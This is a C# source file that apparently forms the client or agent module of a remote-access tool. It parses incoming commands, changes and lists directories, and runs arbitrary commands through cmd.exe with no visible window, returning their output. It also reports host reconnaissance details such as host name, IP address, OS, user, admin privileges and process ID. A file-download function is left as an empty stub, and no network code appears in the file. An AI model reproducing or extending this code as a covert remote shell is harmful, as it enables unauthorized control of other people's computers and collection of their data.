using System;

namespace client_software
{
    class Operations{
        private GeneralInfo infoinstance;
        public void CommandParser(string cmd){
            string command="";
            string argument="";
            if(cmd.Contains(" ")){
                command=cmd.Split(" ")[0];
                argument=cmd.Split(" ")[1];
            }
            else{
                command=cmd;
            }
            if(command.Contains("download")){

            }
            else if(command.Contains("cd")){
                SetWorkingDirectory(argument);
            }
            else if(command.Contains("ls")){
                Console.WriteLine(EnumWorkingDirectory(argument));
            }
            else if(command.Contains("info")){
                GetInfo();
            }
            else{
                Console.WriteLine(ExecuteCMD(cmd));
            }
        }
        public void GetInfo(){
            try{
            Console.WriteLine("Host Name: "+infoinstance.hostName);
            Console.WriteLine("IPv4: "+infoinstance.ipv4);
            Console.WriteLine("OS: "+infoinstance.osInfo);
            Console.WriteLine("User: "+infoinstance.userName);
            Console.WriteLine("Privilegs: "+infoinstance.isAdmin);
            Console.WriteLine("Current Directory: "+infoinstance.cDirectory);
            Console.WriteLine("Process Name: "+infoinstance.pName);
            Console.WriteLine("Process ID: "+infoinstance.pID);
            Console.WriteLine("Executable Path: "+infoinstance.ePath);
            }
            catch(Exception e){
                Console.WriteLine(e.Message.ToString());
            }
        }
        public void DownloadFiles(){

        }
        public string ExecuteCMD(string cmd){
            try{
            string results="";
            System.Diagnostics.Process newProcess=new System.Diagnostics.Process();
            newProcess.StartInfo.FileName="cmd.exe";
            newProcess.StartInfo.Arguments="/c "+cmd;
            newProcess.StartInfo.RedirectStandardError=true;
            newProcess.StartInfo.RedirectStandardOutput=true;
            newProcess.StartInfo.CreateNoWindow=true;
            newProcess.StartInfo.WorkingDirectory=infoinstance.cDirectory;
            newProcess.StartInfo.UseShellExecute=false;
            newProcess.Start();
            results+=newProcess.StandardOutput.ReadToEnd();
            results+=newProcess.StandardError.ReadToEnd();
            return results;
            }
            catch(Exception e){
                return e.Message.ToString();
            }
        }
        public string SetWorkingDirectory(string path){
            try{
                System.IO.Directory.SetCurrentDirectory(path);
                return "Directory Changed";
            }
            catch(Exception e){
                return e.Message.ToString();
            }
            
        }
        public string EnumWorkingDirectory(string path){
            try{
            if(path==""){
                path=infoinstance.cDirectory;
            }
            System.Text.StringBuilder sbinstance=new System.Text.StringBuilder();
            var dirs=from line in System.IO.Directory.EnumerateDirectories(path) select line;
            foreach(var dir in dirs){
                sbinstance.Append(dir);
                sbinstance.Append(Environment.NewLine);
            }
            var files=from line in System.IO.Directory.EnumerateFiles(path) select line;
            foreach(var file in files){
                sbinstance.Append(file);
                sbinstance.Append(Environment.NewLine);
            }
            var dirAndFiles=sbinstance.ToString();
            return dirAndFiles;
            }
            catch(Exception e){
                return e.Message.ToString();
            }

        }
       public Operations(GeneralInfo instance){
        infoinstance=instance;
       }
    }
}
